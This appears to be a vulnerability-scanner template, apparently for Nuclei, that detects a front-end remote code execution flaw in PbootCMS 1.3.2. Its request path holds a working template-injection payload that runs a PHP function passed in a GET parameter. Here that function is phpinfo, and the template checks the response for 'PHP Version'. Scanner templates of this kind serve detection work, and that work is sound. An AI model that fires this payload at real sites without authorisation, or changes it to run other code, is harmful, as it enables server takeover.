  name: "pbootcms\u5F00\u6E90\u5EFA\u7AD9\u7CFB\u7EDF1.3.2\u7248\u672C\u524D\u53F0\
    \u4EFB\u610F\u4EE3\u7801\u6267\u884C"
  severity: medium
  tags: PBOOTCMS,rce
requests:
- matchers:
  - status:
    - 200
    type: status
  - condition: and
    part: body
    type: word
    words:
    - PHP Version
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/index.php/Search/index?keyword={pboot:if(true)$a=$_GET[b];$a();//%20)})}{/pboot:if}&b=phpinfo'
